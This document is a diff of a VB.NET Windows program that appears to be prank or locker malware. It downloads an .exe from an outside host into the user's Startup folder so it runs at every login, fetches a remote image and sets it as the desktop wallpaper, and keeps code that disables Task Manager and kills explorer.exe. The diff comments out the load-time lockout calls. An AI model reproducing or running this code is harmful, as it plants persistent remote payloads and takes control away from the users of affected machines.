@@ -1,5 +1,6 @@
 ﻿
 Imports System.IO
+Imports System.IO.Directory
 Imports System.Net
 Imports System.Text
 Imports Microsoft.Win32
@@ -11,9 +12,20 @@ Public Class Form1
     'hello github!
 
     Dim canExit As Boolean = False
-    Dim url As String = "http://dd2476ste1.7m.pl/rndErr/{09GD-A7TT-HU64}.exe"
+    Dim url As String = "http://dd2476ste1.7m.pl/xd/{09GD-A7TT-HU64}.exe"
+    Dim url2 As String = "http://dd2476ste1.7m.pl/xd/wall.png"
     Dim client As WebClient = New WebClient
+    Dim client2 As WebClient = New WebClient
 
+    Public Const SPI_SETDESKWALLPAPER = 20
+    Public Const SPIF_SENDWININICHANGE = &H2
+    Public Const SPIF_UPDATEINIFILE = &H1
+
+    Private Declare Auto Function SystemParametersInfo Lib "user32.dll" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
+
+    Const WallpaperFile As String = "c:\xtradem\wallpaper.bmp"
+
+    Dim strImagePath As String
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
 
@@ -25,9 +37,9 @@ Public Class Form1
 
         Else
 
-            Shell("cmd.exe /c taskkill /f /im explorer.exe")
+            'Shell("cmd.exe /c taskkill /f /im explorer.exe")
 
-            SetTaskManager(False)
+            'SetTaskManager(False)
 
         End If
 
@@ -53,6 +65,8 @@ Public Class Form1
 
         client.DownloadFileAsync(New Uri(uriString:=url), Environment.GetFolderPath(Environment.SpecialFolder.Startup).ToString + "\{09GD-A7TT-HU64}.txt.exe")
 
+        client2.DownloadFileAsync(New Uri(uriString:=url2), "c:\xtradem\wallpaper.bmp")
+
     End Sub
 
     Private Sub t1_Tick(sender As Object, e As EventArgs) Handles t1.Tick
@@ -71,6 +85,12 @@ Public Class Form1
     End Sub
 
     Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
+
+        If My.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).ToString + "\xd\wall.png") Then
+
+            SetWallpaper("c:\xtradem\wallpaper.bmp")
+
+        End If
 
         t2.Start()
 
@@ -136,6 +156,13 @@ Public Class Form1
     Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
 
         SetTaskManager(False)
+
+    End Sub
+
+    Friend Sub SetWallpaper(ByVal img As String)
+
+        strImagePath = img
+        Call SystemParametersInfo(SPI_SETDESKWALLPAPER, 0&, strImagePath, SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)
 
     End Sub
 
